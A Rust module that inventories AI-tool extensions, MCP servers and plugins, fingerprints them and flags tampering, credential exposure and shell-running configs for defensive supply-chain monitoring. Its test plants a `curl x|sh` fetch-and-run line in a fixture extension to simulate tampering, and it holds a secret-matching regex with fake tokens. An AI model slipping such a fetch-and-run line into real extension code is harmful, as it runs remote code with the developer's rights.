//! Inventory of what extends this machine's AI tools: editor extensions (VS Code, Cursor,
//! Windsurf, ...), MCP servers and Claude Code plugins, and what changed since the last look.
//!
//! A compromised extension or MCP server runs with the developer's rights, so the first
//! question after a supply-chain attack is "who has it?". [`scan`] reads the tools' own
//! records (no network, nothing executed) into [`Item`]s with a fingerprint of their code or
//! configuration; [`Tracker`] compares scans and reports [`Change`]s: added, removed, updated
//! and *modified* (same version, different code: tampering).
//!
//! Nothing secret is kept: MCP commands have credential-looking arguments replaced with
//! `[redacted]`, and only the names of environment variables are read.

use std::collections::BTreeMap;
use std::path::{Path, PathBuf};

use serde::{Deserialize, Serialize};
use serde_json::Value;
use sha2::{Digest, Sha256};

/// Extensions installed less than this long ago are flagged `recent`.
const RECENT_MS: i64 = 7 * 86_400_000;
/// Largest entry file hashed for an extension fingerprint.
const MAX_HASH_BYTES: u64 = 32 * 1024 * 1024;
/// Changes kept in the state file.
const MAX_CHANGES: usize = 1000;

#[derive(Clone, Debug, Default, PartialEq, Eq, Serialize, Deserialize)]
#[serde(default)]
pub struct Item {
    /// `kind:app:id`, unique on this machine.
    pub key: String,
    /// `extension`, `mcp` or `plugin`.
    pub kind: String,
    /// The tool it belongs to, e.g. `Cursor`, `Claude Code`.
    pub app: String,
    /// Extension id (`publisher.name`), MCP server name or plugin name.
    pub id: String,
    pub name: String,
    pub version: Option<String>,
    pub publisher: Option<String>,
    /// `gallery`, `vsix`, `config` or `unknown`.
    pub source: String,
    /// MCP: the command line, credentials redacted.
    pub command: Option<String>,
    /// MCP over HTTP: the server's host.
    pub url_host: Option<String>,
    /// SHA-256 of the code (extensions), commit (plugins) or configuration (MCP).
    pub fingerprint: Option<String>,
    pub installed_at: Option<i64>,
    /// `recent`, `sideloaded`, `pre_release`, `unpinned`, `remote`, `runs_shell`,
    /// `secret_in_args`, `modified`.
    pub flags: Vec<String>,
    /// Extension folder (for the fingerprint cache; never uploaded).
    #[serde(skip_serializing_if = "Option::is_none")]
    pub path: Option<String>,
}

#[derive(Clone, Debug, Default, PartialEq, Eq, Serialize, Deserialize)]
#[serde(default)]
pub struct Change {
    pub ts: i64,
    /// `added`, `removed`, `updated` or `modified`.
    pub change: String,
    pub key: String,
    pub kind: String,
    pub app: String,
    pub id: String,
    pub name: String,
    pub from_version: Option<String>,
    pub to_version: Option<String>,
}

/// An organisation's decision about an item (from Shadow Hub).
#[derive(Clone, Debug, Default, PartialEq, Eq, Serialize, Deserialize)]
#[serde(default)]
pub struct Policy {
    pub kind: String,
    pub id: String,
    /// `None`: every version.
    pub version: Option<String>,
    /// `blocked` or `approved`.
    pub decision: String,
    pub note: Option<String>,
}

impl Policy {
    pub fn matches(&self, i: &Item) -> bool {
        self.kind == i.kind
            && self.id.eq_ignore_ascii_case(&i.id)
            && self
                .version
                .as_deref()
                .filter(|v| !v.is_empty())
                .is_none_or(|v| i.version.as_deref() == Some(v))
    }
}

// ---------------------------------------------------------------------------------------
// Scan

/// Where things live, relative to the home and config directories (overridable in tests).
#[derive(Clone, Debug)]
pub struct Roots {
    pub home: PathBuf,
    /// `~/Library/Application Support` on macOS, `~/.config` on Linux, `%APPDATA%` on Windows.
    pub config: PathBuf,
}

impl Roots {
    pub fn detect() -> Option<Self> {
        let home = dirs::home_dir()?;
        let config = dirs::config_dir().unwrap_or_else(|| home.join(".config"));
        Some(Self { home, config })
    }
}

const EDITORS: &[(&str, &str)] = &[
    ("VS Code", ".vscode/extensions"),
    ("VS Code Insiders", ".vscode-insiders/extensions"),
    ("VSCodium", ".vscode-oss/extensions"),
    ("Cursor", ".cursor/extensions"),
    ("Windsurf", ".windsurf/extensions"),
    ("Kiro", ".kiro/extensions"),
    ("Trae", ".trae/extensions"),
    ("Antigravity", ".antigravity/extensions"),
];

/// Read everything installed. `cache` holds fingerprints from the last scan by
/// `path|mtime|size`, so unchanged extensions are not hashed again.
pub fn scan(roots: &Roots, cache: &BTreeMap<String, String>, now: i64) -> Vec<Item> {
    let mut items = vec![];
    for (app, rel) in EDITORS {
        items.extend(editor_extensions(app, &roots.home.join(rel), cache, now));
    }
    items.extend(mcp_servers(roots));
    items.extend(claude_plugins(
        &roots.home.join(".claude/plugins/installed_plugins.json"),
        now,
    ));
    items.sort_by(|a, b| a.key.cmp(&b.key));
    items.dedup_by(|a, b| a.key == b.key);
    items
}

fn read_json(p: &Path) -> Option<Value> {
    let text = std::fs::read_to_string(p).ok()?;
    serde_json::from_str(&text)
        .ok()
        .or_else(|| serde_json::from_str(&strip_jsonc(&text)).ok())
}

/// Drop `//` and `/* */` comments and trailing commas (VS Code's JSONC).
fn strip_jsonc(s: &str) -> String {
    let mut out = String::with_capacity(s.len());
    let (mut in_str, mut esc) = (false, false);
    let b = s.as_bytes();
    let mut i = 0;
    while i < b.len() {
        let c = b[i] as char;
        if in_str {
            out.push(c);
            if esc {
                esc = false;
            } else if c == '\\' {
                esc = true;
            } else if c == '"' {
                in_str = false;
            }
        } else if c == '"' {
            in_str = true;
            out.push(c);
        } else if c == '/' && b.get(i + 1) == Some(&b'/') {
            while i < b.len() && b[i] != b'\n' {
                i += 1;
            }
            continue;
        } else if c == '/' && b.get(i + 1) == Some(&b'*') {
            i += 2;
            while i + 1 < b.len() && !(b[i] == b'*' && b[i + 1] == b'/') {
                i += 1;
            }
            i += 2;
            continue;
        } else {
            out.push(c);
        }
        i += 1;
    }
    regex::Regex::new(r",(\s*[}\]])")
        .map(|re| re.replace_all(&out, "$1").into_owned())
        .unwrap_or(out)
}

fn editor_extensions(
    app: &str,
    dir: &Path,
    cache: &BTreeMap<String, String>,
    now: i64,
) -> Vec<Item> {
    let mut out = vec![];
    let listed = read_json(&dir.join("extensions.json"));
    let entries: Vec<Value> = match listed.as_ref().and_then(Value::as_array) {
        Some(a) => a.clone(),
        // Older layouts: one folder per extension, no index.
        None => std::fs::read_dir(dir)
            .into_iter()
            .flatten()
            .flatten()
            .filter(|e| e.path().join("package.json").is_file())
            .map(|e| serde_json::json!({"relativeLocation": e.file_name().to_string_lossy()}))
            .collect(),
    };
    for e in entries {
        let s = |p: &str| e.pointer(p).and_then(Value::as_str).map(str::to_string);
        let folder = s("/location/path")
            .or_else(|| s("/location/fsPath"))
            .map(PathBuf::from)
            .or_else(|| s("/relativeLocation").map(|r| dir.join(r)));
        let Some(folder) = folder else { continue };
        let pkg = read_json(&folder.join("package.json")).unwrap_or_default();
        let p = |k: &str| pkg.get(k).and_then(Value::as_str).map(str::to_string);
        let id =
            s("/identifier/id").or_else(|| Some(format!("{}.{}", p("publisher")?, p("name")?)));
        let Some(id) = id.map(|i| i.to_ascii_lowercase()) else {
            continue;
        };
        let version = s("/version").or_else(|| p("version"));
        let name = p("displayName")
            .filter(|n| !n.starts_with('%'))
            .unwrap_or_else(|| id.clone());
        let meta = e.get("metadata").cloned().unwrap_or_default();
        let mb = |k: &str| meta.get(k).and_then(Value::as_bool).unwrap_or(false);
        let source = meta
            .get("source")
            .and_then(Value::as_str)
            .map(|s| match s {
                "gallery" => "gallery",
                "vsix" | "resource" => "vsix",
                _ => "unknown",
            })
            .unwrap_or(if listed.is_some() {
                "unknown"
            } else {
                "gallery"
            })
            .to_string();
        let installed_at = meta.get("installedTimestamp").and_then(Value::as_i64);
        let mut flags = vec![];
        if installed_at.is_some_and(|t| now - t < RECENT_MS) {
            flags.push("recent".to_string());
        }
        if source == "vsix" {
            flags.push("sideloaded".into());
        }
        if mb("preRelease") || mb("isPreReleaseVersion") {
            flags.push("pre_release".into());
        }
        let entries: Vec<String> = ["main", "browser"].iter().filter_map(|k| p(k)).collect();
        out.push(Item {
            key: format!("extension:{app}:{id}"),
            kind: "extension".into(),
            app: app.into(),
            name,
            version,
            publisher: meta
                .get("publisherDisplayName")
                .and_then(Value::as_str)
                .map(str::to_string)
                .or_else(|| p("publisher")),
            source,
            fingerprint: fingerprint_extension(&folder, &entries, cache),
            installed_at,
            flags,
            path: Some(folder.to_string_lossy().into_owned()),
            id,
            ..Item::default()
        });
    }
    out
}

/// Cache key of a file: path, modification time and size.
fn stamp(p: &Path) -> Option<String> {
    let m = std::fs::metadata(p).ok()?;
    let t = m
        .modified()
        .ok()?
        .duration_since(std::time::UNIX_EPOCH)
        .ok()?
        .as_millis();
    Some(format!("{}|{t}|{}", p.display(), m.len()))
}

/// SHA-256 over `package.json` and the entry files (`main`, `browser`), which hold the code
/// an extension runs (usually bundled into one file).
fn fingerprint_extension(
    dir: &Path,
    entries: &[String],
    cache: &BTreeMap<String, String>,
) -> Option<String> {
    let mut files = vec![dir.join("package.json")];
    for e in entries {
        let f = dir.join(e.trim_start_matches("./"));
        let f = if f.is_file() {
            f
        } else {
            f.with_extension("js")
        };
        if f.is_file() && f.starts_with(dir) {
            files.push(f);
        }
    }
    let stamps: Vec<String> = files.iter().filter_map(|f| stamp(f)).collect();
    let key = stamps.join("\n");
    if let Some(h) = cache.get(&key) {
        return Some(h.clone());
    }
    let mut h = Sha256::new();
    for f in &files {
        let len = std::fs::metadata(f).map(|m| m.len()).unwrap_or(0);
        if len > MAX_HASH_BYTES {
            h.update(format!("large:{len}"));
            continue;
        }
        h.update(
            f.strip_prefix(dir)
                .unwrap_or(f)
                .to_string_lossy()
                .as_bytes(),
        );
        h.update([0]);
        h.update(std::fs::read(f).ok()?);
    }
    Some(hex::encode(h.finalize()))
}

/// The fingerprints computed in `items`, as a cache for the next scan.
pub fn fingerprint_cache(items: &[Item]) -> BTreeMap<String, String> {
    let mut out = BTreeMap::new();
    for i in items.iter().filter(|i| i.kind == "extension") {
        let (Some(dir), Some(fp)) = (&i.path, &i.fingerprint) else {
            continue;
        };
        let dir = Path::new(dir);
        let pkg = read_json(&dir.join("package.json")).unwrap_or_default();
        let mut files = vec![dir.join("package.json")];
        for k in ["main", "browser"] {
            if let Some(e) = pkg.get(k).and_then(Value::as_str) {
                let f = dir.join(e.trim_start_matches("./"));
                let f = if f.is_file() {
                    f
                } else {
                    f.with_extension("js")
                };
                if f.is_file() && f.starts_with(dir) {
                    files.push(f);
                }
            }
        }
        let key: Vec<String> = files.iter().filter_map(|f| stamp(f)).collect();
        out.insert(key.join("\n"), fp.clone());
    }
    out
}

/// MCP configuration files: `(app, path relative to home or config, key holding servers)`.
fn mcp_sources(roots: &Roots) -> Vec<(&'static str, PathBuf, &'static str)> {
    vec![
        ("Claude Code", roots.home.join(".claude.json"), "mcpServers"),
        (
            "Claude Code",
            roots.home.join(".claude/settings.json"),
            "mcpServers",
        ),
        (
            "Claude Desktop",
            roots.config.join("Claude/claude_desktop_config.json"),
            "mcpServers",
        ),
        ("Cursor", roots.home.join(".cursor/mcp.json"), "mcpServers"),
        (
            "Windsurf",
            roots.home.join(".codeium/windsurf/mcp_config.json"),
            "mcpServers",
        ),
        (
            "VS Code",
            roots.config.join("Code/User/mcp.json"),
            "servers",
        ),
        (
            "VS Code",
            roots.config.join("Code/User/settings.json"),
            "mcp.servers",
        ),
        (
            "Gemini CLI",
            roots.home.join(".gemini/settings.json"),
            "mcpServers",
        ),
        (
            "Kiro",
            roots.home.join(".kiro/settings/mcp.json"),
            "mcpServers",
        ),
    ]
}

fn mcp_servers(roots: &Roots) -> Vec<Item> {
    let mut out = vec![];
    for (app, path, key) in mcp_sources(roots) {
        let Some(v) = read_json(&path) else { continue };
        let mut maps = vec![];
        let top = if key == "mcp.servers" {
            v.get("mcp.servers").or_else(|| v.pointer("/mcp/servers"))
        } else {
            v.get(key)
        };
        maps.extend(top.and_then(Value::as_object).cloned());
        // Claude Code also keeps servers per project.
        if app == "Claude Code" {
            for p in v
                .get("projects")
                .and_then(Value::as_object)
                .into_iter()
                .flatten()
            {
                maps.extend(p.1.get("mcpServers").and_then(Value::as_object).cloned());
            }
        }
        for m in maps {
            for (name, cfg) in m {
                out.push(mcp_item(app, &name, &cfg));
            }
        }
    }
    // Codex: `[mcp_servers.<name>]` in ~/.codex/config.toml.
    if let Some(t) = std::fs::read_to_string(roots.home.join(".codex/config.toml"))
        .ok()
        .and_then(|s| s.parse::<toml::Table>().ok())
    {
        for (name, cfg) in t
            .get("mcp_servers")
            .and_then(|v| v.as_table())
            .into_iter()
            .flatten()
        {
            if let Ok(v) = serde_json::to_value(cfg) {
                out.push(mcp_item("Codex", name, &v));
            }
        }
    }
    out
}

fn is_secretish(s: &str) -> bool {
    static RE: std::sync::OnceLock<regex::Regex> = std::sync::OnceLock::new();
    RE.get_or_init(|| {
        regex::Regex::new(
            r"(?i)^(sk-[\w-]{10,}|sk_(live|test)_\w+|gh[pousr]_\w{20,}|github_pat_\w+|xox[abposr]-[\w-]+|AKIA[0-9A-Z]{16}|AIza[\w-]{30,}|glpat-[\w-]{16,}|eyJ[\w-]{10,}\.[\w-]{10,}\.[\w-]+|[A-Za-z0-9+/_-]{40,}={0,2})$",
        )
        .expect("valid")
    })
    .is_match(s)
        || s
            .split_once('=')
            .is_some_and(|(k, v)| !v.is_empty() && is_secret_name(k.trim_start_matches('-')))
}

/// An environment variable or flag name that holds a credential: one of its parts (split on
/// `_`, `-`, `.`) is a credential word, e.g. `GITHUB_TOKEN`, `api-key`, not `NODE_PATH`.
fn is_secret_name(k: &str) -> bool {
    let parts: Vec<String> = k
        .split(['_', '-', '.'])
        .map(str::to_ascii_lowercase)
        .collect();
    parts.iter().any(|p| {
        matches!(
            p.as_str(),
            "token"
                | "key"
                | "apikey"
                | "secret"
                | "password"
                | "passwd"
                | "pat"
                | "credential"
                | "credentials"
                | "auth"
        )
    }) || parts.windows(2).any(|w| w[0] == "api" && w[1] == "key")
}

fn mcp_item(app: &str, name: &str, cfg: &Value) -> Item {
    let s = |k: &str| cfg.get(k).and_then(Value::as_str).map(str::to_string);
    let command = s("command");
    let args: Vec<String> = cfg
        .get("args")
        .and_then(Value::as_array)
        .map(|a| {
            a.iter()
                .filter_map(|x| x.as_str().map(str::to_string))
                .collect()
        })
        .unwrap_or_default();
    let url = s("url").or_else(|| s("serverUrl")).or_else(|| s("httpUrl"));
    let env_names: Vec<String> = cfg
        .get("env")
        .and_then(Value::as_object)
        .map(|o| o.keys().cloned().collect())
        .unwrap_or_default();
    let env_literal = cfg.get("env").and_then(Value::as_object).is_some_and(|o| {
        o.values().any(|v| {
            v.as_str()
                .is_some_and(|s| !s.is_empty() && !s.starts_with("${"))
        })
    });
    let headers_literal = cfg
        .get("headers")
        .and_then(Value::as_object)
        .is_some_and(|o| {
            o.values()
                .any(|v| v.as_str().is_some_and(|s| !s.starts_with("${")))
        });
    let mut flags = vec![];
    let mut secret = env_literal && env_names.iter().any(|k| is_secret_name(k));
    // Redact credential-looking arguments and the value after a credential flag.
    let mut shown = vec![];
    let mut redact_next = false;
    for a in &args {
        if redact_next || is_secretish(a) {
            shown.push("[redacted]".to_string());
            secret = true;
            redact_next = false;
            continue;
        }
        let lower = a.to_ascii_lowercase();
        redact_next = lower.starts_with("--") && is_secret_name(&lower[2..]) && !a.contains('=');
        shown.push(a.chars().take(200).collect());
    }
    let cmd_line = command.as_ref().map(|c| {
        std::iter::once(c.clone())
            .chain(shown.iter().cloned())
            .collect::<Vec<_>>()
            .join(" ")
            .chars()
            .take(500)
            .collect::<String>()
    });
    let exe = command
        .as_deref()
        .map(|c| {
            c.rsplit(['/', '\\'])
                .next()
                .unwrap_or(c)
                .to_ascii_lowercase()
        })
        .unwrap_or_default();
    if matches!(
        exe.as_str(),
        "npx" | "bunx" | "pnpx" | "uvx" | "pipx" | "dlx"
    ) || args.first().is_some_and(|a| a == "dlx")
    {
        let pkg = args.iter().find(|a| !a.starts_with('-') && *a != "dlx");
        let pinned = pkg.is_some_and(|p| {
            let at = p.trim_start_matches('@');
            (at.contains('@') && !at.ends_with("@latest")) || p.contains("==")
        });
        if !pinned {
            flags.push("unpinned".to_string());
        }
    }
    if matches!(
        exe.as_str(),
        "sh" | "bash" | "zsh" | "cmd" | "cmd.exe" | "powershell" | "pwsh" | "powershell.exe"
    ) {
        flags.push("runs_shell".into());
    }
    let url_host = url.as_deref().and_then(|u| {
        let rest = u.split("://").nth(1)?;
        Some(
            rest.split(['/', '?', '#'])
                .next()?
                .rsplit('@')
                .next()?
                .to_ascii_lowercase(),
        )
    });
    if let Some(h) = &url_host {
        let local = h.starts_with("localhost") || h.starts_with("127.") || h.starts_with("[::1]");
        if !local {
            flags.push("remote".into());
        }
    }
    if headers_literal {
        secret = true;
    }
    if secret {
        flags.push("secret_in_args".into());
    }
    // The fingerprint covers what decides what runs (command, arguments, URL, env names), not
    // the secret values.
    let mut h = Sha256::new();
    h.update(command.as_deref().unwrap_or(""));
    for a in &args {
        h.update([0]);
        h.update(if is_secretish(a) { "[secret]" } else { a });
    }
    h.update([1]);
    h.update(url.as_deref().unwrap_or(""));
    for k in &env_names {
        h.update([2]);
        h.update(k);
    }
    let version = args.iter().find_map(|a| {
        let at = a.trim_start_matches('@');
        at.rsplit_once('@')
            .map(|(_, v)| v.to_string())
            .filter(|v| v.chars().next().is_some_and(|c| c.is_ascii_digit()))
    });
    Item {
        key: format!("mcp:{app}:{name}"),
        kind: "mcp".into(),
        app: app.into(),
        id: name.chars().take(120).collect(),
        name: name.chars().take(120).collect(),
        version,
        source: "config".into(),
        command: cmd_line,
        url_host,
        fingerprint: Some(hex::encode(h.finalize())),
        flags,
        ..Item::default()
    }
}

fn claude_plugins(path: &Path, now: i64) -> Vec<Item> {
    let Some(v) = read_json(path) else {
        return vec![];
    };
    let mut out = vec![];
    for (name, installs) in v
        .get("plugins")
        .and_then(Value::as_object)
        .into_iter()
        .flatten()
    {
        let Some(i) = installs.as_array().and_then(|a| a.first()) else {
            continue;
        };
        let s = |k: &str| i.get(k).and_then(Value::as_str).map(str::to_string);
        let installed_at = s("installedAt")
            .and_then(|t| chrono::DateTime::parse_from_rfc3339(&t).ok())
            .map(|d| d.timestamp_millis());
        let mut flags = vec![];
        if installed_at.is_some_and(|t| now - t < RECENT_MS) {
            flags.push("recent".to_string());
        }
        let (id, marketplace) = name.split_once('@').unwrap_or((name, ""));
        out.push(Item {
            key: format!("plugin:Claude Code:{name}"),
            kind: "plugin".into(),
            app: "Claude Code".into(),
            id: name.clone(),
            name: id.to_string(),
            version: s("version"),
            publisher: Some(marketplace.to_string()).filter(|m| !m.is_empty()),
            source: "gallery".into(),
            fingerprint: s("gitCommitSha"),
            installed_at,
            flags,
            ..Item::default()
        });
    }
    out
}

// ---------------------------------------------------------------------------------------
// Changes

/// Saved between scans: the last items, the fingerprint cache and recent changes.
#[derive(Clone, Debug, Default, Serialize, Deserialize)]
#[serde(default)]
pub struct State {
    pub items: Vec<Item>,
    pub cache: BTreeMap<String, String>,
    pub changes: Vec<Change>,
    pub scanned_at: i64,
    /// From Shadow Hub, when this machine is connected.
    pub policy: Vec<Policy>,
    /// Changes not yet sent to Shadow Hub.
    pub unsent: Vec<Change>,
}

/// Compare a new scan with the last one. The first scan only sets the baseline.
pub fn diff(old: &[Item], new: &[Item], now: i64, first: bool) -> Vec<Change> {
    if first {
        return vec![];
    }
    let before: BTreeMap<&str, &Item> = old.iter().map(|i| (i.key.as_str(), i)).collect();
    let after: BTreeMap<&str, &Item> = new.iter().map(|i| (i.key.as_str(), i)).collect();
    let change = |c: &str, i: &Item, from: Option<String>, to: Option<String>| Change {
        ts: now,
        change: c.into(),
        key: i.key.clone(),
        kind: i.kind.clone(),
        app: i.app.clone(),
        id: i.id.clone(),
        name: i.name.clone(),
        from_version: from,
        to_version: to,
    };
    let mut out = vec![];
    for (k, i) in &after {
        match before.get(k) {
            None => out.push(change("added", i, None, i.version.clone())),
            Some(o) if o.version != i.version => {
                out.push(change("updated", i, o.version.clone(), i.version.clone()))
            }
            Some(o)
                if o.fingerprint.is_some()
                    && i.fingerprint.is_some()
                    && o.fingerprint != i.fingerprint =>
            {
                out.push(change("modified", i, o.version.clone(), i.version.clone()))
            }
            _ => {}
        }
    }
    for (k, o) in &before {
        if !after.contains_key(k) {
            out.push(change("removed", o, o.version.clone(), None));
        }
    }
    out
}

impl State {
    pub fn load(path: &Path) -> Option<Self> {
        serde_json::from_slice(&std::fs::read(path).ok()?).ok()
    }

    pub fn save(&self, path: &Path) -> anyhow::Result<()> {
        crate::vault::write_atomic(path, &serde_json::to_vec(self)?, true)
    }

    /// Take a new scan: record changes, carry the `modified` flag for items whose code
    /// changed without a version change until they change again.
    pub fn update(&mut self, mut items: Vec<Item>, now: i64) -> Vec<Change> {
        let first = self.scanned_at == 0;
        let changes = diff(&self.items, &items, now, first);
        let modified: Vec<&str> = changes
            .iter()
            .filter(|c| c.change == "modified")
            .map(|c| c.key.as_str())
            .collect();
        for i in items.iter_mut() {
            let was = self.items.iter().find(|o| o.key == i.key).is_some_and(|o| {
                o.flags.iter().any(|f| f == "modified") && o.fingerprint == i.fingerprint
            });
            if (modified.contains(&i.key.as_str()) || was)
                && !i.flags.iter().any(|f| f == "modified")
            {
                i.flags.push("modified".into());
            }
        }
        self.cache = fingerprint_cache(&items);
        self.items = items;
        self.scanned_at = now;
        self.changes.extend(changes.iter().cloned());
        let n = self.changes.len();
        if n > MAX_CHANGES {
            self.changes.drain(..n - MAX_CHANGES);
        }
        self.unsent.extend(changes.iter().cloned());
        let n = self.unsent.len();
        if n > MAX_CHANGES {
            self.unsent.drain(..n - MAX_CHANGES);
        }
        changes
    }

    /// Items an organisation blocked that are installed here.
    pub fn blocked(&self) -> Vec<(&Item, &Policy)> {
        self.items
            .iter()
            .filter_map(|i| {
                self.policy
                    .iter()
                    .find(|p| p.decision == "blocked" && p.matches(i))
                    .map(|p| (i, p))
            })
            .collect()
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use serde_json::json;

    fn write(p: &Path, s: &str) {
        std::fs::create_dir_all(p.parent().unwrap()).unwrap();
        std::fs::write(p, s).unwrap();
    }

    #[test]
    fn scans_extensions_mcp_and_plugins_and_tracks_changes() {
        let dir = tempfile::tempdir().unwrap();
        let roots = Roots {
            home: dir.path().join("home"),
            config: dir.path().join("cfg"),
        };
        let ext = roots.home.join(".cursor/extensions");
        let now = 1_800_000_000_000i64;
        write(
            &ext.join("acme.helper-1.0.0/package.json"),
            r#"{"name":"helper","publisher":"acme","displayName":"Helper","version":"1.0.0","main":"./out/extension.js"}"#,
        );
        write(
            &ext.join("acme.helper-1.0.0/out/extension.js"),
            "console.log('hi')",
        );
        write(&ext.join("extensions.json"), &json!([{
            "identifier": {"id": "Acme.helper"}, "version": "1.0.0",
            "location": {"path": ext.join("acme.helper-1.0.0").to_string_lossy()},
            "metadata": {"installedTimestamp": now - 86_400_000, "source": "vsix", "publisherDisplayName": "Acme"}
        }]).to_string());
        write(&roots.home.join(".claude.json"), &json!({"mcpServers": {
            "gh": {"command": "npx", "args": ["-y", "@modelcontextprotocol/server-github"], "env": {"GITHUB_TOKEN": "ghp_aaaaaaaaaaaaaaaaaaaaaaaaaaaa"}},
            "db": {"command": "/bin/bash", "args": ["-c", "run --api-key", "sk-live-1234567890abcdef"]},
            "remote": {"type": "http", "url": "https://mcp.example.com/sse"}
        }}).to_string());
        write(
            &roots.home.join(".claude/plugins/installed_plugins.json"),
            r#"{"plugins":{"helper@acme-market":[{"version":"0.2.0","installedAt":"2026-01-01T00:00:00Z","gitCommitSha":"abc123"}]}}"#,
        );

        let items = scan(&roots, &BTreeMap::new(), now);
        let get = |k: &str| {
            items
                .iter()
                .find(|i| i.key == k)
                .unwrap_or_else(|| panic!("{k}: {items:#?}"))
        };
        let e = get("extension:Cursor:acme.helper");
        assert_eq!(
            (e.name.as_str(), e.version.as_deref()),
            ("Helper", Some("1.0.0"))
        );
        assert!(e.flags.contains(&"recent".into()) && e.flags.contains(&"sideloaded".into()));
        let gh = get("mcp:Claude Code:gh");
        assert!(
            gh.flags.contains(&"unpinned".into()) && gh.flags.contains(&"secret_in_args".into()),
            "{gh:?}"
        );
        let db = get("mcp:Claude Code:db");
        assert!(db.flags.contains(&"runs_shell".into()));
        let shown = serde_json::to_string(&items).unwrap();
        assert!(
            !shown.contains("sk-live") && !shown.contains("ghp_"),
            "no secrets kept"
        );
        assert_eq!(
            get("mcp:Claude Code:remote").url_host.as_deref(),
            Some("mcp.example.com")
        );
        assert_eq!(
            get("plugin:Claude Code:helper@acme-market")
                .fingerprint
                .as_deref(),
            Some("abc123")
        );

        // Baseline, then tampering (same version, new code) and a removal.
        let mut st = State::default();
        assert!(st.update(items, now).is_empty());
        write(
            &ext.join("acme.helper-1.0.0/out/extension.js"),
            "require('child_process').exec('curl x|sh')",
        );
        std::fs::remove_file(roots.home.join(".claude/plugins/installed_plugins.json")).unwrap();
        let changes = st.update(scan(&roots, &st.cache.clone(), now + 1), now + 1);
        let kinds: Vec<(&str, &str)> = changes
            .iter()
            .map(|c| (c.change.as_str(), c.id.as_str()))
            .collect();
        assert!(kinds.contains(&("modified", "acme.helper")), "{kinds:?}");
        assert!(
            kinds.contains(&("removed", "helper@acme-market")),
            "{kinds:?}"
        );
        assert!(st
            .items
            .iter()
            .any(|i| i.flags.contains(&"modified".into())));
        // A blocked item is reported.
        st.policy = vec![Policy {
            kind: "extension".into(),
            id: "acme.helper".into(),
            decision: "blocked".into(),
            ..Policy::default()
        }];
        assert_eq!(st.blocked().len(), 1);
    }

    #[test]
    fn credential_names_are_whole_words() {
        for k in [
            "GITHUB_TOKEN",
            "OPENAI_API_KEY",
            "api-key",
            "DB_PASSWORD",
            "SLACK_BOT_TOKEN",
        ] {
            assert!(is_secret_name(k), "{k}");
        }
        for k in [
            "NODE_PATH",
            "MONKEY",
            "TOKENIZER_MODE",
            "KEYBOARD",
            "SKY_CUA_SERVICE_PATH",
            "PATH",
        ] {
            assert!(!is_secret_name(k), "{k}");
        }
    }

    #[test]
    fn jsonc_is_read() {
        let v: Value = serde_json::from_str(&strip_jsonc(
            "{\n // c\n \"a\": \"x//y\", /* b */ \"b\": [1,],\n}",
        ))
        .unwrap();
        assert_eq!(v["a"], "x//y");
    }
}
